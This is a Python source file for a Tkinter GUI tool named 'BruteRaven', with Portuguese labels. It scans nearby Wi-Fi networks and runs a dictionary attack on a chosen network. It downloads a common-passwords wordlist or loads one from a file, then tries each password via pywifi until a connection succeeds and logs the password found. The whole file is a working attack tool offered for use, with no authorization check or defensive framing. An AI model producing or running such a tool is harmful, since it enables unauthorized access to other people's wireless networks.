import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import threading
import pywifi
from pywifi import const
import urllib.request
import time

class WifiBruteForceUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("BruteRaven")
        self.geometry("900x750")
        self.resizable(False, False)

        # Variáveis
        self.url_var = tk.StringVar(value="https://www.ncsc.gov.uk/static-assets/documents/PwnedPasswordsTop100k.txt")
        self.verbose_var = tk.BooleanVar(value=True)
        self.quick_var = tk.BooleanVar(value=False)
        self.passwords = []
        self.networks = []  # lista de dicts: {'ssid': ..., 'signal': ..., 'auth': ...}
        self.selected_network = None
        self.brute_force_thread = None
        self.stop_brute_force_flag = threading.Event()

        self.create_widgets()
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]

    def create_widgets(self):
        frame_wordlist = ttk.LabelFrame(self, text="Wordlist")
        frame_wordlist.pack(fill="x", padx=10, pady=5)

        ttk.Label(frame_wordlist, text="URL da wordlist:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
        url_entry = ttk.Entry(frame_wordlist, textvariable=self.url_var, width=70)
        url_entry.grid(row=0, column=1, sticky="w", padx=5, pady=5)

        btn_load_url = ttk.Button(frame_wordlist, text="Carregar da URL", command=self.load_passwords_from_url)
        btn_load_url.grid(row=0, column=2, padx=5, pady=5)

        btn_load_file = ttk.Button(frame_wordlist, text="Carregar de Arquivo", command=self.load_passwords_from_file)
        btn_load_file.grid(row=1, column=2, padx=5, pady=5)

        frame_opts = ttk.Frame(frame_wordlist)
        frame_opts.grid(row=1, column=0, columnspan=2, sticky="w", padx=5, pady=5)

        ttk.Checkbutton(frame_opts, text="Verbose", variable=self.verbose_var).pack(side="left", padx=5)
        ttk.Checkbutton(frame_opts, text="Quick Mode", variable=self.quick_var).pack(side="left", padx=5)

        # Redes Wi-Fi com detalhes na Treeview
        frame_networks = ttk.LabelFrame(self, text="Redes Wi-Fi Detectadas")
        frame_networks.pack(fill="both", expand=True, padx=10, pady=5)

        self.btn_scan = ttk.Button(frame_networks, text="Escanear Redes", command=self.scan_networks)
        self.btn_scan.pack(anchor="nw", padx=5, pady=5)

        columns = ("SSID", "Sinal (dBm)", "Segurança")
        self.tree_ssids = ttk.Treeview(frame_networks, columns=columns, show="headings", height=10)
        for col in columns:
            self.tree_ssids.heading(col, text=col)
            self.tree_ssids.column(col, width=200 if col == "SSID" else 100, anchor="center")
        self.tree_ssids.pack(fill="both", expand=True, padx=5, pady=5)
        self.tree_ssids.bind("<<TreeviewSelect>>", self.on_network_select)

        # Controles brute force com botão parar
        frame_controls = ttk.Frame(self)
        frame_controls.pack(fill="x", padx=10, pady=5)

        self.btn_start = ttk.Button(frame_controls, text="Iniciar Brute Force", command=self.start_brute_force)
        self.btn_start.pack(side="left", padx=5)

        self.btn_stop = ttk.Button(frame_controls, text="Parar Ataque", command=self.stop_brute_force, state="disabled")
        self.btn_stop.pack(side="left", padx=5)

        self.btn_clear_log = ttk.Button(frame_controls, text="Limpar Log", command=self.clear_log)
        self.btn_clear_log.pack(side="left", padx=5)

        # Log
        frame_log = ttk.LabelFrame(self, text="Log de Execução")
        frame_log.pack(fill="both", expand=True, padx=10, pady=5)

        self.text_log = tk.Text(frame_log, height=15, state="disabled", wrap="word")
        self.text_log.pack(fill="both", expand=True, padx=5, pady=5)

        scrollbar = ttk.Scrollbar(frame_log, command=self.text_log.yview)
        scrollbar.pack(side="right", fill="y")
        self.text_log.config(yscrollcommand=scrollbar.set)

    def log(self, message):
        self.text_log.configure(state="normal")
        self.text_log.insert("end", message + "\n")
        self.text_log.see("end")
        self.text_log.configure(state="disabled")

    def clear_log(self):
        self.text_log.configure(state="normal")
        self.text_log.delete("1.0", "end")
        self.text_log.configure(state="disabled")

    def load_passwords_from_url(self):
        url = self.url_var.get()
        if not url:
            messagebox.showerror("Erro", "Informe a URL da wordlist.")
            return

        def task():
            self.log(f"[+] Baixando lista de senhas da URL: {url}")
            try:
                with urllib.request.urlopen(url) as response:
                    lines = [line.decode("utf-8").strip() for line in response if line.strip()]
                self.passwords = lines
                self.log(f"[✓] Wordlist carregada com {len(lines)} senhas.")
            except Exception as e:
                self.log(f"[×] Erro ao baixar wordlist: {e}")

        threading.Thread(target=task, daemon=True).start()

    def load_passwords_from_file(self):
        path = filedialog.askopenfilename(title="Selecione arquivo de wordlist", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not path:
            return

        def task():
            self.log(f"[+] Lendo lista de senhas do arquivo: {path}")
            try:
                with open(path, "r", encoding="utf-8") as f:
                    lines = [line.strip() for line in f if line.strip()]
                self.passwords = lines
                self.log(f"[✓] Wordlist carregada com {len(lines)} senhas.")
            except Exception as e:
                self.log(f"[×] Erro ao ler arquivo: {e}")

        threading.Thread(target=task, daemon=True).start()

    def scan_networks(self):
        self.log("[+] Escaneando redes Wi-Fi...")
        self.btn_scan.config(state="disabled")
        self.tree_ssids.delete(*self.tree_ssids.get_children())
        self.networks = []

        def task():
            self.iface.scan()
            time.sleep(1 if self.quick_var.get() else 3)
            results = self.iface.scan_results()
            seen = set()
            for net in results:
                if net.ssid and net.ssid not in seen:
                    seen.add(net.ssid)
                    auth = self.auth_to_string(net.akm)
                    self.networks.append({
                        'ssid': net.ssid,
                        'signal': net.signal,
                        'auth': auth
                    })

            if not self.networks:
                self.log("[×] Nenhuma rede Wi-Fi encontrada.")
            else:
                self.log(f"[✓] {len(self.networks)} redes encontradas.")
                for net in self.networks:
                    self.tree_ssids.insert("", "end", values=(net['ssid'], net['signal'], net['auth']))
            self.btn_scan.config(state="normal")

        threading.Thread(target=task, daemon=True).start()

    def auth_to_string(self, akm_list):
        # Converte lista de constantes pywifi.akm para texto legível
        if not akm_list:
            return "Aberto"
        names = []
        for akm in akm_list:
            if akm == const.AKM_TYPE_NONE:
                names.append("Aberto")
            elif akm == const.AKM_TYPE_WPA:
                names.append("WPA")
            elif akm == const.AKM_TYPE_WPAPSK:
                names.append("WPA-PSK")
            elif akm == const.AKM_TYPE_WPA2:
                names.append("WPA2")
            elif akm == const.AKM_TYPE_WPA2PSK:
                names.append("WPA2-PSK")
            elif akm == const.AKM_TYPE_WPA3:
                names.append("WPA3")
            else:
                names.append("Outro")
        return ", ".join(names)

    def on_network_select(self, event):
        selected = self.tree_ssids.selection()
        if selected:
            index = self.tree_ssids.index(selected[0])
            self.selected_network = self.networks[index]
            self.log(f"[+] Rede selecionada: {self.selected_network['ssid']}")

    def start_brute_force(self):
        if not self.passwords:
            messagebox.showwarning("Aviso", "Carregue a wordlist antes de iniciar.")
            return
        if not self.selected_network:
            messagebox.showwarning("Aviso", "Selecione uma rede Wi-Fi para atacar.")
            return

        if self.brute_force_thread and self.brute_force_thread.is_alive():
            messagebox.showinfo("Info", "Brute force já está em execução.")
            return

        self.stop_brute_force_flag.clear()
        self.btn_start.config(state="disabled")
        self.btn_stop.config(state="normal")
        ssid = self.selected_network['ssid']
        self.log(f"[+] Iniciando brute force na rede: {ssid}")

        def brute_force():
            iface = self.iface
            verbose = self.verbose_var.get()
            ssid = self.selected_network['ssid']

            def connect(ssid, password):
                profile = pywifi.Profile()
                profile.ssid = ssid
                profile.auth = const.AUTH_ALG_OPEN
                profile.akm = []
                if "WPA" in self.selected_network['auth']:
                    profile.akm.append(const.AKM_TYPE_WPA2PSK)
                else:
                    profile.akm.append(const.AKM_TYPE_NONE)
                profile.cipher = const.CIPHER_TYPE_CCMP
                profile.key = password

                iface.remove_all_network_profiles()
                tmp_profile = iface.add_network_profile(profile)
                iface.connect(tmp_profile)
                time.sleep(2.5)
                return iface.status() == const.IFACE_CONNECTED

            for pwd in self.passwords:
                if self.stop_brute_force_flag.is_set():
                    self.log("[!] Ataque interrompido pelo usuário.")
                    break
                if len(pwd) < 8:
                    if verbose:
                        self.log(f"[SKIP] Senha muito curta: {pwd}")
                    continue
                if verbose:
                    self.log(f"[TESTANDO] {pwd}")
                else:
                    # Mostrar a senha atual testada mesmo sem verbose, só simplificado
                    self.log(f"[TESTANDO] {pwd}")

                if connect(ssid, pwd):
                    self.log(f"\n[✓] SENHA ENCONTRADA: {pwd}")
                    break
            else:
                if not self.stop_brute_force_flag.is_set():
                    self.log("\n[×] Nenhuma senha funcionou.")

            self.btn_start.config(state="normal")
            self.btn_stop.config(state="disabled")

        self.brute_force_thread = threading.Thread(target=brute_force, daemon=True)
        self.brute_force_thread.start()

    def stop_brute_force(self):
        if self.brute_force_thread and self.brute_force_thread.is_alive():
            self.stop_brute_force_flag.set()
            self.log("[!] Solicitado parada do ataque...")

if __name__ == "__main__":
    app = WifiBruteForceUI()
    app.mainloop()